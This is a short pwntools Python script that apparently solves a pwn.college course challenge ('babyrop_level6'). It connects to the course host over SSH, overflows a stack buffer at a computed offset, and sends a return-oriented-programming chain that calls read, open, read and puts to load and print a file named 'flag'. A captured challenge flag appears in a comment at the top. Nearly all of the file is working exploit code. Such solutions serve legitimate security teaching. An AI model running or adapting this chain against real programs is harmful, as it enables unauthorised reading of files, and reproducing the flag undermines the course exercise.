#!/usr/bin/env python3
#pwn_college{s-B6fYtJDYc0M4Yq0NsVeLj0Meg.dRjNywCN2gzW}
#python3 solution.py


from pwn import *

local = False
#local = True

context.arch = 'amd64'
elf = context.binary = ELF('./babyrop_level6_testing1')

if local:
    p = elf.process()
    raw_input("attach gdb")
else:
    s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
    p = s.process("./babyrop_level6_testing1")

nop = cyclic_find("laaaaaaa", n=8)
data_section = 0x404500 # known memory address in data section where flag's filename and later flag content will get copied

rop = ROP(elf)

rop.call("read", [0x00, data_section, 0x08])
rop.call("open", [data_section, 0x00, 0x00])
rop.call("read", [0x03, data_section, 0x40])
rop.call("puts", [data_section])

payload = fit({nop : rop.chain()})
print(rop.dump())

p.recvuntil("!\n###")
p.sendline(payload)

flag_path = b'flag\x00\x00\x00\x00'
p.sendline(flag_path) # input 'flag' as a filename to store in known location in data_section

p.interactive()

